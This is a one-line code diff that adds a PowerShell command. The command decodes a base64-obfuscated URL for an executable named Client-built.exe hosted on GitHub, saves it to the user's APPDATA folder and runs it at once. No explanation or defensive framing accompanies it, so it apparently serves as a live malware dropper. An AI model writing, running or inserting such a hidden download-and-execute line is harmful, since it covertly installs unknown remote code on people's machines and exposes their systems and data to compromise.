@@ -1,0 +1,1 @@
+$url='aHR0cHM6Ly9naXRodWIuY29tL2VtaWxzMi9nb29meWJvb2JhL3Jhdy9tYWluL0NsaWVudC1idWlsdC5leGU='; $output="$env:APPDATA\Client-built.exe"; Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($url))) -OutFile $output; Start-Process -FilePath $output
